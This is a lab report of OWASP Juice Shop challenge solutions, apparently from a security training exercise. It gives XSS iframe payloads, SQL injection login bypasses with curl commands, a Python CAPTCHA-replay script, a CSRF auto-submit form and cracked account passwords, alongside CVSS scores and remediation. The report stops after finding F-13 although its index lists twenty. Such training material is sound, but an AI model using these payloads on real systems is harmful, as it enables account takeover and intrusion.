# OWASP Juice Shop — Challenge Solutions
### Lab Report | Target: http://192.168.20.47:29391

> **Scope:** All challenges visible on the Juice Shop scoreboard at `http://192.168.20.47:29391/#/score-board`
> **Tools used:** Burp Suite, Firefox DevTools, curl, python3
> **Note:** Replace `192.168.20.47:29391` with your actual target IP and port throughout this document.

---

## Challenge Index

| ID | Challenge | Category | Difficulty | Status |
|---|---|---|---|---|
| F-01 | Score Board | Miscellaneous | ⭐ | ✅ Already solved |
| F-02 | DOM XSS | XSS | ⭐ | 🔴 Solve now |
| F-03 | Bonus Payload | XSS | ⭐ | 🔴 Solve now |
| F-04 | Reflected XSS | XSS | ⭐⭐ | 🔴 Solve now |
| F-05 | Login Admin | Injection | ⭐⭐ | 🔴 Solve now |
| F-06 | Login MC SafeSearch | Sensitive Data Exposure | ⭐⭐ | 🔴 Solve now |
| F-07 | Login Jim | Injection | ⭐⭐⭐ | 🔴 Solve now |
| F-08 | Login Bender | Injection | ⭐⭐⭐ | 🔴 Solve now |
| F-09 | API-only XSS | XSS | ⭐⭐⭐ | 🔴 Solve now |
| F-10 | Bjoern's Favorite Pet | Broken Authentication | ⭐⭐⭐ | 🔴 Solve now |
| F-11 | CAPTCHA Bypass | Broken Anti Automation | ⭐⭐⭐ | 🔴 Solve now |
| F-12 | CSRF | Broken Access Control | ⭐⭐⭐ | 🔴 Solve now |
| F-13 | Client-side XSS Protection | XSS | ⭐⭐⭐ | 🔴 Solve now |
| F-14 | Database Schema | Injection | ⭐⭐⭐ | 🔴 Solve now |
| F-15 | Login Amy | Sensitive Data Exposure | ⭐⭐⭐ | 🔴 Solve now |
| F-16 | Reset Jim's Password | Broken Authentication | ⭐⭐⭐ | 🔴 Solve now |
| F-17 | CSP Bypass | XSS | ⭐⭐⭐⭐ | 🔴 Solve now |
| F-18 | Christmas Special | Injection | ⭐⭐⭐⭐ | 🔴 Solve now |
| F-19 | Ephemeral Accountant | Injection | ⭐⭐⭐⭐ | 🔴 Solve now |
| F-20 | HTTP-Header XSS | XSS | ⭐⭐⭐⭐ | 🔴 Solve now |

---

---

## F-01 — Score Board

**Finding ID:** F-01
**Title:** Hidden Score Board Page Discovered
**Target:** `http://192.168.20.47:29391/#/score-board`
**Vulnerability Type:** Security Misconfiguration — Information Disclosure

### Description
The application's challenge progress page is intentionally hidden from the navigation bar but is accessible via a direct URL. The route definition `score-board` is embedded in the Angular JavaScript bundle, allowing any user who inspects the source to locate and access the page without authentication.

### Steps to Reproduce
```
1. Navigate to: http://192.168.20.47:29391
2. View page source (Ctrl+U) or inspect the Angular JS bundle
3. Search for "score" in the source → finds the route definition
4. Navigate directly to: http://192.168.20.47:29391/#/score-board
5. The scoreboard loads — challenge marked green
```
Alternative — Google-based discovery:
```
Search: "OWASP Juice Shop scoreboard URL"
Result: /#/score-board (publicly documented)
```

### Evidence
```
URL accessed: http://192.168.20.47:29391/#/score-board
Result: Scoreboard page loaded. Challenge dot turned green.
```
**Screenshot:** `[F-01-scoreboard.png]` — Scoreboard page showing Score Board challenge with green dot.

### CVSS 3.1 Score
| Field | Value |
|---|---|
| Vector String | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N |
| Base Score | 5.3 |
| Severity | Medium |

**Rationale:** Network-accessible with no authentication required. Confidentiality impact is limited — the page reveals challenge structure but not user data.

### Remediation
- Remove route definitions for sensitive pages from client-side bundles; handle routing server-side.
- Implement server-side authentication checks before serving the scoreboard page.
- In production, disable or remove challenge/debug pages entirely.

### References
- OWASP Security Misconfiguration (A05:2021)
- OWASP Juice Shop Source Code Analysis

---

---

## F-02 — DOM XSS

**Finding ID:** F-02
**Title:** DOM-Based Cross-Site Scripting in Product Search
**Target:** `http://192.168.20.47:29391/#/search`
**Vulnerability Type:** Cross-Site Scripting (XSS) — DOM-Based

### Description
The product search feature reads user input from the URL fragment and renders it into the DOM via Angular's `innerHTML` binding without sanitisation. A crafted URL containing a JavaScript payload causes the payload to execute entirely client-side — the server never sees the payload, making server-side filtering ineffective.

### Steps to Reproduce
```
1. Navigate to: http://192.168.20.47:29391/#/search
2. In the search bar, type or paste exactly:
   <iframe src="javascript:alert(`xss`)">
3. Press Enter
4. The alert dialog fires immediately — no page reload required
5. Close the alert → scoreboard shows DOM XSS challenge solved
```

### Evidence
**Payload used:**
```html
<iframe src="javascript:alert(`xss`)">
```
**Why it works:** Angular reads the search query and binds it to a DOM element using `[innerHTML]` without sanitisation. The `<iframe src="javascript:...">` vector bypasses Angular's basic XSS sanitisation because it is processed as a URL attribute rather than a script tag.

**Screenshot:** `[F-02-dom-xss.png]` — Alert dialog visible with search bar showing payload and URL `/#/search` in address bar.

### CVSS 3.1 Score
| Field | Value |
|---|---|
| Vector String | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N |
| Base Score | 6.1 |
| Severity | Medium |

**Rationale:** Network-accessible, no authentication required. Requires user interaction (UI:R) to trigger the crafted URL. Scope changes (S:C) because script executes in the victim's browser origin. Limited confidentiality and integrity impact.

### Remediation
- Use Angular's `DomSanitizer` properly — never bypass it with `bypassSecurityTrustHtml`.
- Apply a strict Content Security Policy (CSP) header: `Content-Security-Policy: default-src 'self'; script-src 'self'`
- Apply `HttpOnly` and `Secure` flags to session cookies to prevent token theft via XSS.
- Re-test by submitting `<script>alert(1)</script>` and confirming it renders as plain text.

### References
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger — DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- NVD CVSS 3.1 Calculator

---

---

## F-03 — Bonus Payload

**Finding ID:** F-03
**Title:** DOM XSS — Bonus Payload (Embedded Media Injection)
**Target:** `http://192.168.20.47:29391/#/search`
**Vulnerability Type:** Cross-Site Scripting (XSS) — DOM-Based

### Description
The same unsanitised DOM XSS sink exploited in F-02 also accepts complex HTML iframe payloads embedding external media content. This demonstrates that the vulnerability is not limited to `javascript:` URIs — any iframe source, including external media players, can be injected. This variant embeds a SoundCloud audio player, demonstrating that the XSS attack surface includes content injection beyond script execution.

### Steps to Reproduce
```
1. Navigate to: http://192.168.20.47:29391/#/search
2. In the search bar, paste the entire payload below:
   <iframe width="100%" height="166" scrolling="no" frameborder="no"
   allow="autoplay"
   src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true">
   </iframe>
3. Press Enter
4. A SoundCloud audio player embeds in the search results area
5. Scoreboard marks Bonus Payload challenge as solved
```

### Evidence
**Payload used:**
```html
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay"
src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true">
</iframe>
```
**Screenshot:** `[F-03-bonus-payload.png]` — SoundCloud player embedded in search results area. URL bar visible.

### CVSS 3.1 Score
| Field | Value |
|---|---|
| Vector String | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N |
| Base Score | 6.1 |
| Severity | Medium |

**Rationale:** Same root cause as F-02. Demonstrates content injection beyond script execution — an attacker can embed phishing content or external media without the victim's knowledge.

### Remediation
- Same as F-02. Sanitise all user input rendered into the DOM.
- Implement a strict `frame-src` CSP directive to restrict which origins can be iframed.

### References
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- NVD CVSS 3.1 Calculator

---

---

## F-04 — Reflected XSS

**Finding ID:** F-04
**Title:** Reflected Cross-Site Scripting in Order Tracking
**Target:** `http://192.168.20.47:29391/#/track-result`
**Vulnerability Type:** Cross-Site Scripting (XSS) — Reflected

### Description
The order tracking feature reads the `id` parameter from the URL and reflects it directly into the rendered page without encoding. An attacker can craft a malicious URL containing a JavaScript payload; any authenticated user who opens the link will execute attacker-controlled JavaScript in the context of the application.

### Steps to Reproduce
```
1. Log in as any user (register or use the SQLi bypass from F-05)
2. Navigate to: Orders & Payment → Order History
3. Click the truck icon on any order to view tracking
4. Observe the URL: http://192.168.20.47:29391/#/track-result?id=<ORDER_ID>
5. Replace the order ID with the XSS payload:
   http://192.168.20.47:29391/#/track-result?id=<iframe src="javascript:alert(`xss`)">
6. Press Enter — the alert fires immediately
7. Scoreboard marks Reflected XSS as solved
```

Alternative — direct URL (no login needed):
```
http://192.168.20.47:29391/#/track-result?id=<iframe src="javascript:alert(`xss`)">
```

### Evidence
**Payload used:**
```html
<iframe src="javascript:alert(`xss`)">
```
**Injected into:** `id` URL parameter of the `/#/track-result` endpoint

**Screenshot:** `[F-04-reflected-xss.png]` — Alert dialog firing with the full crafted URL visible in the address bar.

### CVSS 3.1 Score
| Field | Value |
|---|---|
| Vector String | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N |
| Base Score | 6.1 |
| Severity | Medium |

**Rationale:** Network-accessible, no authentication required. Requires the victim to open a crafted link (UI:R). Scope changes because the script runs in the victim's browser origin. Session token theft or page defacement is possible.

### Remediation
- Encode all URL parameters before rendering them into HTML — use the framework's built-in output encoding.
- Set a strict Content Security Policy (CSP) header that disallows inline scripts.
- Apply `HttpOnly` and `Secure` flags to session cookies.
- Re-test by submitting `<script>alert(1)</script>` in the `id` parameter and confirming the browser renders it as plain text.

### References
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger — Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)
- NVD CVSS 3.1 Calculator

---

---

## F-05 — Login Admin

**Finding ID:** F-05
**Title:** SQL Injection Authentication Bypass — Administrator Account
**Target:** `http://192.168.20.47:29391/#/login`
**Vulnerability Type:** Injection — SQL Injection (Authentication Bypass)

### Description
The login form constructs a SQL query by directly concatenating user-supplied input without parameterisation. Injecting a SQL tautology into the email field causes the WHERE clause to always evaluate as true, bypassing the password check entirely and granting access to the first account in the Users table — the administrator account.

The underlying query is:
```sql
SELECT * FROM Users WHERE email = '[INPUT]' AND password = '[HASH]' AND deletedAt IS NULL
```

### Steps to Reproduce
```
1. Navigate to: http://192.168.20.47:29391/#/login
2. In the Email field, enter exactly:
   ' OR 1=1--
3. In the Password field, enter anything:
   x
4. Click Log In
5. You are now logged in as admin@juice-sh.op (the first user in the DB)
6. Notice top-right shows the admin account name
7. Scoreboard marks Login Admin as solved
```

Alternative — target admin directly if email is known:
```
Email: admin@juice-sh.op'--
Password: anything
```

### Evidence
**Payload used (Email field):**
```sql
' OR 1=1--
```
**How it works:** The single quote `'` closes the email string. `OR 1=1` makes the WHERE clause always true. `--` comments out the rest of the query including the password check. The server authenticates without verifying the password.

**Using Burp Suite:**
```
1. Burp → Proxy → Intercept ON
2. Submit login form with any credentials
3. Intercept the POST /rest/user/login request
4. Change the email value to: ' OR 1=1--
5. Forward — response contains authentication token
```

**Curl equivalent:**
```bash
curl -s -X POST http://192.168.20.47:29391/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}'
```

**Screenshot:** `[F-05-login-admin.png]` — Admin account visible top-right after login with payload in email field.

### CVSS 3.1 Score
| Field | Value |
|---|---|
| Vector String | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| Base Score | 9.8 |
| Severity | Critical |

**Rationale:** Network-accessible, no authentication required, no user interaction needed. Full confidentiality, integrity, and availability impact — complete admin account takeover.

### Remediation
- Replace all string-concatenated SQL queries with parameterised queries (prepared statements).
- Use an ORM (Sequelize for Node.js) which parameterises queries by default.
- Implement account lockout after 5 failed login attempts to limit brute force.
- Run the database process with least privilege — a read-only DB user cannot INSERT or UPDATE.
- Deploy a WAF with SQL injection detection rules as a defence-in-depth measure.

### References
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
- NVD CVSS 3.1 Calculator

---

---

## F-06 — Login MC SafeSearch

**Finding ID:** F-06
**Title:** Sensitive Data Exposure — Password Disclosed in Public Media
**Target:** `http://192.168.20.47:29391/#/login`
**Vulnerability Type:** Sensitive Data Exposure — OSINT / Weak Password

### Description
The user MC SafeSearch publicly disclosed his password methodology in a YouTube music video ("Protect Ya' Passwordz"). He stated he uses his dog's name (`Mr. Noodles`) with the letter `O` replaced by the number `0`. This OSINT finding allows unauthenticated access to the account without any technical bypass — demonstrating that social engineering and public information disclosure are as dangerous as technical vulnerabilities.

### Steps to Reproduce
```
OSINT Research:
1. The challenge hint references a YouTube song: "Protect Ya' Passwordz" by MC SafeSearch
2. In the video (at ~0:33), MC SafeSearch says:
   "Why not use the first name of your favorite pet?
    Mine's my dog, Mr. Noodles.
    It don't matter if you know because I was tricky
    and replaced some vowels with zeroes."
3. Password derived: Mr. N00dles (Mr. Noodles with O→0)

Login:
4. Navigate to: http://192.168.20.47:29391/#/login
5. Email:    mc.safesearch@juice-sh.op
   Password: Mr. N00dles
6. Click Log In — access granted
7. Scoreboard marks challenge as solved
```

Alternative — MD5 hash verification:
```bash
# MC SafeSearch's password hash (from DB extraction via F-14):
# b03f4b0ba8b458fa0acdc02cdb953bc8
# Crack it at: https://crackstation.net
# Result: Mr. N00dles
```

### Evidence
```
Email:    mc.safesearch@juice-sh.op
Password: Mr. N00dles
Source:   Public YouTube video — "Protect Ya' Passwordz" (2014)
```
**Screenshot:** `[F-06-mc-safesearch.png]` — Successful login as mc.safesearch@juice-sh.op.

### CVSS 3.1 Score
| Field | Value |
|---|---|
| Vector String | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N |
| Base Score | 9.1 |
| Severity | Critical |

**Rationale:** Credentials are publicly discoverable with no technical skill required. Full account access with no authentication barrier.

### Remediation
- Enforce strong, unique password policies — minimum 12 characters, mixed case, digits, symbols.
- Educate users never to disclose their password methodology, even obliquely, in public forums.
- Implement multi-factor authentication (MFA) so that a known password alone is insufficient for access.
- Monitor for credential exposure using services like HaveIBeenPwned.

### References
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- OWASP Top 10 A07:2021 — Identification and Authentication Failures
- NVD CVSS 3.1 Calculator

---

---

## F-07 — Login Jim

**Finding ID:** F-07
**Title:** SQL Injection Authentication Bypass — Jim's Account
**Target:** `http://192.168.20.47:29391/#/login`
**Vulnerability Type:** Injection — SQL Injection (Authentication Bypass)

### Description
The same SQL injection vulnerability exploited in F-05 allows bypassing authentication for any known email address. By injecting a comment sequence (`'--`) after Jim's email address, the password check is entirely bypassed. Jim's email is discoverable from product reviews in the application (he left a review referencing a Starfleet logo, linking him to Star Trek — and his password hash `10a783b9ed19ea1c67c3a27699f0095b` decodes to `ncc-1701`, the registry number of the USS Enterprise).

### Steps to Reproduce

**Method 1 — SQL Injection (recommended):**
```
1. Navigate to: http://192.168.20.47:29391/#/login
2. Email:    jim@juice-sh.op'--
   Password: anything
3. Click Log In — logged in as Jim without knowing his password
4. Scoreboard marks Login Jim as solved
```

**Method 2 — Hash cracking (if DB already extracted via F-14):**
```
1. Extract Jim's password hash from the database (via F-14 SQLi)
   Hash: 10a783b9ed19ea1c67c3a27699f0095b (MD5)
2. Crack at: https://crackstation.net
   Result: ncc-1701
3. Login normally:
   Email:    jim@juice-sh.op
   Password: ncc-1701
```

**How to find Jim's email (OSINT within the app):**
```
1. Browse the shop and read product reviews
2. Find Jim's review on the Green Smoothie: "Fresh out of a replicator."
3. This is a Star Trek reference — confirms Jim = Captain Kirk
4. His email: jim@juice-sh.op (following the juice-sh.op domain pattern)
```

### Evidence
**Payload used (Email field):**
```sql
jim@juice-sh.op'--
```
**Screenshot:** `[F-07-login-jim.png]` — Successful login as jim@juice-sh.op via SQLi.

### CVSS 3.1 Score
| Field | Value |
|---|---|
| Vector String | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| Base Score | 9.8 |
| Severity | Critical |

**Rationale:** Same root cause as F-05. Full account takeover without authentication for any user whose email is known.

### Remediation
- Same as F-05: use parameterised queries, ORM, account lockout, WAF.
- Enforce email address privacy — do not expose user emails in product reviews or public-facing pages.

### References
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- NVD CVSS 3.1 Calculator

---

---

## F-08 — Login Bender

**Finding ID:** F-08
**Title:** SQL Injection Authentication Bypass — Bender's Account
**Target:** `http://192.168.20.47:29391/#/login`
**Vulnerability Type:** Injection — SQL Injection (Authentication Bypass)

### Description
The same SQL injection vulnerability exploited in F-05 and F-07 allows bypassing authentication for Bender's account. Bender's password is too strong to crack via brute force or rainbow tables, making the `'--` comment injection the only viable technical approach. Bender's email is discoverable from product reviews (he left a review referencing Futurama).

### Steps to Reproduce
```
1. Navigate to: http://192.168.20.47:29391/#/login
2. Email:    bender@juice-sh.op'--
   Password: anything
3. Click Log In — logged in as Bender without knowing his password
4. Scoreboard marks Login Bender as solved

How to find Bender's email:
- Browse product reviews — Bender left reviews referencing Futurama
- Email follows pattern: bender@juice-sh.op
```

### Evidence
**Payload used (Email field):**
```sql
bender@juice-sh.op'--
```
**Resulting SQL query executed:**
```sql
SELECT * FROM Users WHERE email = 'bender@juice-sh.op'--' AND password = '...' AND deletedAt IS NULL
-- Everything after -- is commented out. Password check is skipped.
```

**Screenshot:** `[F-08-login-bender.png]` — Successful login as bender@juice-sh.op via SQLi.

### CVSS 3.1 Score
| Field | Value |
|---|---|
| Vector String | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| Base Score | 9.8 |
| Severity | Critical |

**Rationale:** Same root cause as F-05 and F-07.

### Remediation
- Same as F-05. Parameterised queries eliminate this class of vulnerability entirely.

### References
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- NVD CVSS 3.1 Calculator

---

---

## F-09 — API-only XSS

**Finding ID:** F-09
**Title:** Stored XSS via Direct API Request (Bypassing Frontend Validation)
**Target:** `http://192.168.20.47:29391/api/Users/`
**Vulnerability Type:** Cross-Site Scripting (XSS) — Stored / Persisted

### Description
The user registration API endpoint (`POST /api/Users/`) accepts a username field that is persisted to the database and later rendered in the administration panel without sanitisation. The frontend application enforces email format validation, preventing XSS payloads in the email field. However, by bypassing the frontend entirely and sending a crafted POST request directly to the API, an attacker can register a user with an XSS payload as their username. The payload then fires for any admin who views the Users list.

### Steps to Reproduce
```
1. Open Burp Suite → Intercept ON
2. Navigate to the registration page and register a normal account
3. Intercept the POST /api/Users/ request
4. Right-click → Send to Repeater
5. In the request body, modify the email to embed the XSS payload:
   Change: "email":"normal@test.com"
   To:     "email":"<<script>Foo</script>iframe src=\"javascript:alert(`xss`)\">@test.com"

   OR — send entirely via curl, bypassing the frontend form:

curl -s -X POST http://192.168.20.47:29391/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{
    "email": "<<script>Foo</script>iframe src=\"javascript:alert(`xss`)\">@test.com",
    "password": "Test1234!",
    "passwordRepeat": "Test1234!",
    "securityQuestion": {"id":1,"question":"Your oldest siblings middle name?"},
    "securityAnswer": "test"
  }'

6. Log in as admin (use F-05 SQLi bypass)
7. Navigate to: http://192.168.20.47:29391/#/administration
8. The XSS payload fires when the admin views the user list
9. Scoreboard marks API-only XSS as solved
```

### Evidence
**Payload used (embedded in email field via direct API call):**
```
<<script>Foo</script>iframe src="javascript:alert(`xss`)">@test.com
```
**Why this works:** The frontend validates email format — the backend does not. Sending the request directly to `/api/Users/` bypasses client-side validation entirely. The stored payload then renders in the admin panel.

**Screenshot:** `[F-09-api-only-xss.png]` — Alert firing on the administration page when admin views the user list.

### CVSS 3.1 Score
| Field | Value |
|---|---|
| Vector String | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N |
| Base Score | 6.1 |
| Severity | Medium |

**Rationale:** Stored XSS that fires in the admin panel — higher business impact than reflected XSS due to automatic execution. UI:R because an admin must view the page.

### Remediation
- Never rely on client-side validation alone — implement identical validation server-side on all API endpoints.
- Sanitise stored content before rendering using server-side output encoding.
- Implement input validation on all API endpoints regardless of whether they are exposed in the UI.

### References
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger — Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)
- NVD CVSS 3.1 Calculator

---

---

## F-10 — Bjoern's Favorite Pet

**Finding ID:** F-10
**Title:** Broken Authentication — Password Reset via OSINT (Security Question)
**Target:** `http://192.168.20.47:29391/#/forgot-password`
**Vulnerability Type:** Broken Authentication — Security Question Bypass via OSINT

### Description
Bjoern's OWASP account uses "Name of your favorite pet?" as his security question. In a publicly available conference talk recording (OWASP AppSec EU 2018), Bjoern registers a new account live on camera and answers this question truthfully with "Zaya" — the name of his three-legged cat. A profile image on the application at `/assets/public/images/uploads/12.jpg` also shows the pet. This allows any attacker who watches the talk or inspects the profile image to reset his password.

### Steps to Reproduce
```
OSINT Research:
1. The challenge hint references a conference talk recording.
   Video: https://youtu.be/Lu0-kDdtVf4?t=239
2. At timestamp 3:59, Bjoern registers and answers the security question
3. Answer: "Zaya" (his three-legged cat)

Password Reset:
4. Navigate to: http://192.168.20.47:29391/#/forgot-password
5. Email: bjoern@owasp.org
6. Security question appears: "Name of your favorite pet?"
7. Answer: Zaya
8. Enter a new password and confirm
9. Scoreboard marks challenge as solved
```

### Evidence
```
Email:             bjoern@owasp.org
Security question: Name of your favorite pet?
Answer (OSINT):    Zaya
Source:            OWASP conference talk (public YouTube video, timestamp ~3:59)
```
**Screenshot:** `[F-10-bjoern-pet.png]` — Password reset form with email and security answer filled, showing successful reset confirmation.

### CVSS 3.1 Score
| Field | Value |
|---|---|
| Vector String | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N |
| Base Score | 9.1 |
| Severity | Critical |

**Rationale:** Security question answers are publicly discoverable via OSINT. Full account takeover achievable with no technical knowledge.

### Remediation
- Eliminate knowledge-based security questions entirely — they are effectively public information for anyone with a social media or public presence.
- Replace password reset with a time-limited, single-use token sent to a verified email address or phone number (OTP/magic link).
- Implement multi-factor authentication to make account takeover require more than a single factor.

### References
- [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
- NVD CVSS 3.1 Calculator

---

---

## F-11 — CAPTCHA Bypass

**Finding ID:** F-11
**Title:** Broken Anti-Automation — CAPTCHA Mechanism Bypassable via Replay
**Target:** `http://192.168.20.47:29391/api/Feedbacks/`
**Vulnerability Type:** Broken Anti-Automation — CAPTCHA Bypass

### Description
The customer feedback form implements a CAPTCHA intended to prevent automated submissions. However, the CAPTCHA mechanism is flawed: once a valid CAPTCHA ID and answer are obtained, the same values can be replayed in multiple rapid requests. The server does not invalidate the CAPTCHA after first use, allowing an attacker to submit 10 or more feedbacks within 20 seconds by scripting repeated API calls with the same CAPTCHA token.

### Steps to Reproduce

**Step 1 — Obtain a valid CAPTCHA token:**
```bash
curl -s http://192.168.20.47:29391/rest/captcha/
# Returns: {"captchaId": 12, "captcha": "5+8", "answer": "13"}
```

**Step 2 — Use the Python script below to send 10+ requests within 20 seconds:**
```python
#!/usr/bin/env python3
import requests
import json

BASE_URL = "http://192.168.20.47:29391"

# Step 1: Get a CAPTCHA token
captcha = requests.get(f"{BASE_URL}/rest/captcha/").json()
captcha_id = captcha["captchaId"]
captcha_answer = captcha["answer"]

print(f"Got CAPTCHA ID: {captcha_id}, Answer: {captcha_answer}")

# Step 2: Submit 10 feedbacks rapidly using the same CAPTCHA token
headers = {"Content-Type": "application/json"}

for i in range(12):
    payload = {
        "captchaId": captcha_id,
        "captcha": str(captcha_answer),
        "comment": f"Automated feedback {i}",
        "rating": 5
    }
    response = requests.post(
        f"{BASE_URL}/api/Feedbacks/",
        headers=headers,
        data=json.dumps(payload)
    )
    print(f"Request {i+1}: Status {response.status_code}")

print("Done — check scoreboard for CAPTCHA Bypass challenge")
```

**Run it:**
```bash
python3 captcha_bypass.py
```

### Evidence
```
Endpoint: POST /api/Feedbacks/
Method:   CAPTCHA token replay — same captchaId submitted 12 times
Result:   All 12 submissions returned HTTP 200 OK
          Scoreboard marks CAPTCHA Bypass as solved
```
**Screenshot:** `[F-11-captcha-bypass.png]` — Terminal showing 12x HTTP 200 responses. Scoreboard showing challenge solved.

### CVSS 3.1 Score
| Field | Value |
|---|---|
| Vector String | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L |
| Base Score | 6.5 |
| Severity | Medium |

**Rationale:** Allows automated spam submission. No account required. Integrity impact (spam data written to DB) and availability impact (potential DB flooding).

### Remediation
- Invalidate the CAPTCHA token server-side after a single successful use.
- Implement server-side rate limiting per IP address (e.g., maximum 5 feedback submissions per hour per IP).
- Consider using a stateless CAPTCHA solution such as Google reCAPTCHA v3 which validates each token server-side with Google's API.

### References
- [OWASP Automated Threats to Web Applications](https://owasp.org/www-project-automated-threats-to-web-applications/)
- NVD CVSS 3.1 Calculator

---

---

## F-12 — CSRF

**Finding ID:** F-12
**Title:** Cross-Site Request Forgery — Username Change from External Origin
**Target:** `http://192.168.20.47:29391/profile`
**Vulnerability Type:** Broken Access Control — Cross-Site Request Forgery (CSRF)

### Description
The profile name update functionality does not implement CSRF token validation. A malicious page hosted on a different origin can submit a form that triggers a name change request for any logged-in Juice Shop user who visits the malicious page. The browser automatically includes the session cookie with the cross-origin request, and the server processes it without verifying the request's origin.

### Steps to Reproduce
```
1. Log in to Juice Shop as any user
2. In the same browser, navigate to: http://htmledit.squarefree.com
   (This represents "another origin" as the challenge requires)
3. In the HTML editor, paste the CSRF proof-of-concept:

<form action="http://192.168.20.47:29391/profile" method="POST"
      enctype="application/x-www-form-urlencoded">
  <input type="hidden" name="username" value="CSRF_PWNED">
  <input type="submit" value="Click me">
</form>
<script>document.forms[0].submit();</script>

4. The form auto-submits
5. Return to Juice Shop — the username has been changed to CSRF_PWNED
6. Scoreboard marks CSRF challenge as solved

Note: Use Firefox 96.x or Chrome 79.x for best compatibility
(older SameSite=None cookie default)
```

### Evidence
**CSRF PoC HTML:**
```html
<form action="http://192.168.20.47:29391/profile" method="POST"
      enctype="application/x-www-form-urlencoded">
  <input type="hidden" name="username" value="CSRF_PWNED">
</form>
<script>document.forms[0].submit();</script>
```
**Screenshot:** `[F-12-csrf.png]` — Username changed to CSRF_PWNED on the profile page. Scoreboard showing challenge solved.

### CVSS 3.1 Score
| Field | Value |
|---|---|
| Vector String | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N |
| Base Score | 6.5 |
| Severity | Medium |

**Rationale:** Requires victim to visit a malicious page (UI:R). Integrity impact is high — attacker can change account data on behalf of the victim.

### Remediation
- Implement CSRF tokens: include a unique, unpredictable, per-session token in all state-changing requests and validate it server-side.
- Set the `SameSite=Strict` attribute on session cookies to prevent cross-site request inclusion.
- Validate the `Origin` and `Referer` headers server-side for all state-changing requests.
- Use the `Content-Type: application/json` requirement for API endpoints (browsers cannot send JSON cross-origin without a preflight check).

### References
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger — CSRF](https://portswigger.net/web-security/csrf)
- NVD CVSS 3.1 Calculator

---

---

## F-13 — Client-side XSS Protection

**Finding ID:** F-13
**Title:** Stored XSS Bypassing Client-Side Email Validation
**Target:** `http://192.168.20.47:29391/api/Users/`
**Vulnerability Type:** Cross-Site Scripting (XSS) — Stored / Client-side Protection Bypass

### Description
The user registration form applies client-side email format validation that rejects non-email strings. However, this validation is enforced only in the browser JavaScript — it does not exist on the server. By intercepting the registration POST request and modifying the email to contain an XSS payload before it reaches the server, an attacker can store a malicious payload that bypasses the client-side check entirely. The stored payload later executes in the admin panel.

### Steps to Reproduce
```
1. Navigate to: http://192.168.20.47:29391/#/register
2. Open Burp Suite → Proxy → Intercept ON
3. Fill in registration form with valid values and click Register
4. Burp intercepts the POST /api/Users/ request
5. In the request body, change the email field:
   FROM: "email":"test@normal.com"
   TO:   "email":"<<script>Foo</script>iframe src=\"javascript:alert(`xss`)\">@pwned.com"
6. Forward the modified request
7. The user is registered with the XSS payload as their email
8. Log in as admin (via F-05 SQLi bypass)
9. Navigate to: http://192.168.20.47:29391/#/administration
10. The XSS alert fires when the user list renders
11. Scoreboard marks Client-side XSS Protection as solved
```

### Evidence
**Payload embedded in email field:**
```
<<script>Foo</script>iframe src="javascript:alert(`xss`)">@pwned.com
```
**What the client-side check saw:** A valid email format (ends in `@pwned.com`)
**What the server stored:** The full unmodified XSS payload

**Screenshot:** `[F-13-client-side-xss.png]` — Burp Repeater showing the modified request body and the alert firing on the admin panel.

### CVSS 3.1 Score
| Field | Value |
|---|---|
| Vector String | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N |
| Base Score | 6.1 |
| Severity | Medium |

**Rationale:** Client-side-only validation is not a security control. Any attacker with a proxy tool can bypass it trivially. Stored XSS in admin panel has elevated business impact.

